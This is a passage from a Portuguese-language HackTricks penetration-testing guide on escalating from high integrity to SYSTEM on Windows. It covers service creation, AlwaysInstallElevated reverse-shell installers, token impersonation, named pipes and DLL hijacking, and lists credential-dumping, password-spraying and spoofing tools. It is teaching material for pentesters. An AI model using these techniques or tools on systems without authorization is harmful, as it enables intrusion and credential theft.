[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **De Alto Nível de Integridade para Sistema**

### **Novo serviço**

Se você já estiver executando em um processo de Alto Nível de Integridade, a **passagem para SISTEMA** pode ser fácil apenas **criando e executando um novo serviço**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

De um processo de Alta Integridade, você pode tentar **habilitar as entradas de registro AlwaysInstallElevated** e **instalar** um shell reverso usando um _**.msi**_ wrapper.\
[Mais informações sobre as chaves de registro envolvidas e como instalar um pacote _.msi_ aqui.](./#alwaysinstallelevated)

### Alta Integridade + Privilégio SeImpersonate para System

**Você pode** [**encontrar o código aqui**](seimpersonate-from-high-to-system.md)**.**

### De SeDebug + SeImpersonate para Privilégios Totais de Token

Se você possui esses privilégios de token (provavelmente encontrará isso em um processo já de Alta Integridade), você poderá **abrir quase qualquer processo** (não processos protegidos) com o privilégio SeDebug, **copiar o token** do processo e criar um **processo arbitrário com esse token**.\
Usando esta técnica, geralmente é **selecionado qualquer processo em execução como SYSTEM com todos os privilégios de token** (_sim, você pode encontrar processos SYSTEM sem todos os privilégios de token_).\
**Você pode encontrar um** [**exemplo de código executando a técnica proposta aqui**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Esta técnica é usada pelo meterpreter para escalar em `getsystem`. A técnica consiste em **criar um pipe e depois criar/abusar de um serviço para escrever nesse pipe**. Então, o **servidor** que criou o pipe usando o privilégio **`SeImpersonate`** será capaz de **impersonar o token** do cliente do pipe (o serviço) obtendo privilégios de SYSTEM.\
Se você quiser [**saber mais sobre named pipes, você deve ler isto**](./#named-pipe-client-impersonation).\
Se você quiser ler um exemplo de [**como ir de alta integridade para System usando named pipes, você deve ler isto**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Se você conseguir **sequestrar uma dll** sendo **carregada** por um **processo** executando como **SYSTEM**, você será capaz de executar código arbitrário com essas permissões. Portanto, Dll Hijacking também é útil para este tipo de escalonamento de privilégios, e, além disso, é **muito mais fácil de alcançar a partir de um processo de alta integridade** pois terá **permissões de escrita** nas pastas usadas para carregar dlls.\
**Você pode** [**aprender mais sobre Dll hijacking aqui**](dll-hijacking.md)**.**

### **De Administrador ou Serviço de Rede para System**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### De LOCAL SERVICE ou NETWORK SERVICE para privilégios completos

**Leia:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Mais ajuda

[Binários estáticos do impacket](https://github.com/ropnop/impacket_static_binaries)

## Ferramentas úteis

**Melhor ferramenta para procurar vetores de escalonamento de privilégios locais do Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Verifica configurações incorretas e arquivos sensíveis (**[**verifique aqui**](../../windows/windows-local-privilege-escalation/broken-reference/)**). Detectado.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Verifica algumas possíveis configurações incorretas e coleta informações (**[**verifique aqui**](../../windows/windows-local-privilege-escalation/broken-reference/)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Verifica configurações incorretas**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrai informações de sessões salvas do PuTTY, WinSCP, SuperPuTTY, FileZilla e RDP. Use -Thorough localmente.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrai credenciais do Gerenciador de Credenciais. Detectado.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Aplica senhas coletadas em todo o domínio**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh é uma ferramenta de spoofing e man-in-the-middle para ADIDNS/LLMNR/mDNS/NBNS no PowerShell.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumeração básica de privesc do Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Procura por vulnerabilidades conhecidas de privesc (DEPRECATED para Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Verificações locais **(Necessita de direitos de Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Procura por vulnerabilidades conhecidas de privesc (precisa ser compilado usando VisualStudio) ([**precompilado**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera o host procurando por configurações incorretas (mais uma ferramenta de coleta de informações do que privesc) (precisa ser compilado) **(**[**precompilado**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrai credenciais de vários softwares (exe pré-compilado no github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port do PowerUp para C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Verifica configurações incorretas (executável pré-compilado no github). Não recomendado. Não funciona bem no Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Verifica possíveis configurações incorretas (exe do python). Não recomendado. Não funciona bem no Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Ferramenta criada com base neste post (não precisa do accesschk para funcionar corretamente, mas pode usá-lo).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lê a saída do **systeminfo** e recomenda exploits funcionais (python local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lê a saída do **systeminfo** e recomenda exploits funcionais (python local)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Você tem que compilar o projeto usando a versão correta do .NET ([veja isto](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Para ver a versão instalada do .NET no host vítima, você pode fazer:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Bibliografia

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\
[http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
[https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\
[https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\
[https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\
[https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\
[https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
[https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **versão mais recente do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* Adquira o [**material oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
